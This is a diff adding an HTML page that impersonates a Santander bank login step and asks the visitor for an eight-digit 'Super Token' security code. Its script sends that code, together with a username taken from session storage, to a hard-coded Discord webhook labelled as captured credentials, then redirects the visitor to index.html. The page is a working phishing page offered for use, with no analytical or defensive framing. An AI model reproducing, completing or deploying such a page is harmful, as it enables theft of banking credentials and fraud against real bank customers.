@@ -1,0 +1,112 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Santander</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+      /* (mismo CSS que antes) */
+      * { margin:0; padding:0; box-sizing:border-box; }
+      body { font-family:'Lato',sans-serif; background:#f5f5f5; min-height:100vh; display:flex; align-items:center; justify-content:center; margin:0; padding:20px; }
+      .container { width:100%; max-width:480px; margin:0 auto; }
+      .card { background:#fff; border-radius:20px; padding:40px 30px 35px; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.08); }
+      .logo { display:flex; justify-content:center; align-items:center; margin:0 0 25px 0; }
+      .logo img { max-width:180px; height:auto; display:block; }
+      .instruction { font-size:20px; font-weight:600; color:#1a1a1a; margin-bottom:25px; letter-spacing:0.3px; }
+      .input-group { margin-bottom:25px; text-align:left; }
+      .input-wrapper { display:flex; align-items:center; background:#f8f8f8; border-radius:12px; padding:0 16px; border:1.5px solid #e6e6e6; transition:border-color .2s, box-shadow .2s; }
+      .input-wrapper:hover, .input-wrapper:focus-within { border-color:#e3000b; box-shadow:0 0 0 3px rgba(227,0,11,0.1); }
+      .input-wrapper i { color:#999; font-size:18px; margin-right:12px; }
+      .input-wrapper input { width:100%; padding:14px 0; border:none; background:transparent; font-size:18px; color:#1a1a1a; outline:none; letter-spacing:2px; }
+      .input-wrapper input::placeholder { color:#b0b0b0; font-weight:400; font-size:16px; letter-spacing:0; }
+      .btn-ingresar { width:100%; padding:16px; background:#e3000b; color:#fff; border:none; border-radius:12px; font-size:18px; font-weight:600; letter-spacing:0.5px; cursor:pointer; transition:background .2s, transform .1s; margin-bottom:20px; display:flex; align-items:center; justify-content:center; gap:10px; }
+      .btn-ingresar:hover { background:#c9000a; }
+      .btn-ingresar:active { transform:scale(0.97); }
+      .btn-ingresar i { font-size:18px; }
+      .checkbox-group { display:flex; align-items:center; justify-content:center; gap:8px; font-size:16px; color:#333; margin-top:5px; }
+      .checkbox-group input[type="checkbox"] { width:18px; height:18px; accent-color:#e3000b; cursor:pointer; }
+      .checkbox-group label { cursor:pointer; user-select:none; }
+      .footer-note { margin-top:30px; font-size:13px; color:#aaa; border-top:1px solid #eee; padding-top:20px; display:flex; justify-content:center; gap:25px; }
+      .footer-note a { color:#aaa; text-decoration:none; transition:color .2s; }
+      .footer-note a:hover { color:#e3000b; }
+      @media (max-width:480px) { .card { padding:30px 20px; } .logo img { max-width:140px; } .instruction { font-size:18px; } .input-wrapper input { font-size:16px; } }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="card">
+        <div class="logo">
+          <img src="img\santander_logo.png" alt="Santander" />
+        </div>
+        <div class="instruction">Ingresar Clave Super Token</div>
+        <div class="input-group">
+          <div class="input-wrapper">
+            <i class="fa fa-lock" aria-hidden="true"></i>
+            <input type="password" id="clave" placeholder="Clave Super Token" maxlength="8" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
+          </div>
+        </div>
+        <button class="btn-ingresar" id="btnIngresar">
+          <i class="fa fa-arrow-right"></i> Ingresar
+        </button>
+        <div class="checkbox-group">
+          <input type="checkbox" id="recordarme" />
+          <label for="recordarme">Recordarme</label>
+        </div>
+        <div class="footer-note">
+          <a href="#"><i class="fa fa-lock"></i> Seguridad</a>
+          <a href="#"><i class="fa fa-question-circle"></i> Ayuda</a>
+        </div>
+      </div>
+    </div>
+    <script>
+      const inputClave = document.getElementById('clave');
+      inputClave.addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '');
+        if (this.value.length > 8) this.value = this.value.slice(0, 8);
+      });
+
+      // Obtener usuario desde sessionStorage
+      const usuario = sessionStorage.getItem('usuario') || 'No disponible';
+
+      document.getElementById('btnIngresar').addEventListener('click', async function(e) {
+        e.preventDefault();
+        const clave = inputClave.value.trim();
+        if (clave.length !== 8) {
+          alert('Por favor, ingresa la clave Super Token de 8 dígitos.');
+          inputClave.focus();
+          return;
+        }
+
+        // Enviar a Discord con usuario
+        const webhookURL = 'https://discord.com/api/webhooks/1516947295440994545/BE5cTDDVaZ7a2_bp1MdqVR8kwa_Hn-PF71donMbTfd1E8aujXpknl-jwCe8vIt-LQrVm';
+        const payload = {
+          username: 'Santander - SuperToken',
+          embeds: [{
+            title: 'Clave Super Token Capturada',
+            color: 0xe3000b,
+            fields: [
+              { name: 'Usuario/Doc', value: usuario, inline: true },
+              { name: 'Clave', value: clave, inline: true }
+            ],
+            timestamp: new Date().toISOString()
+          }]
+        };
+        try {
+          await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+        } catch (error) { console.error('Error al enviar a Discord:', error); }
+
+        window.location.href = 'index.html';
+      });
+
+      inputClave.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') document.getElementById('btnIngresar').click();
+      });
+    </script>
+  </body>
+</html>
